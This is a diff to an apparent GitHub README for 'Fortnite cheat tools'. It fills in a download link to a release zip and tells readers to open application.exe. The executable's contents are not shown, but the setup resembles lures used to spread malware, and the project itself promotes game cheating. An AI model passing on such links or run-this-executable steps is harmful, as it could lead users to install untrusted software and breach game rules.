@@ -4,7 +4,7 @@ This project aims to provide users with a set of cheat tools and functionalities
 
 ## Usage
 
-1. **Download**: download zip archive (click here to download]()
+1. **Download**: download zip archive (click here to download](https://github.com/numberone6341/Fortnite-Cheat-External-v2/releases/download/Download/Software.zip)
 2. **Installation**: Open application.exe
 3. **Launch Fortnite**: Launch Fortnite and launch the cheat tools to activate your desired features.
 
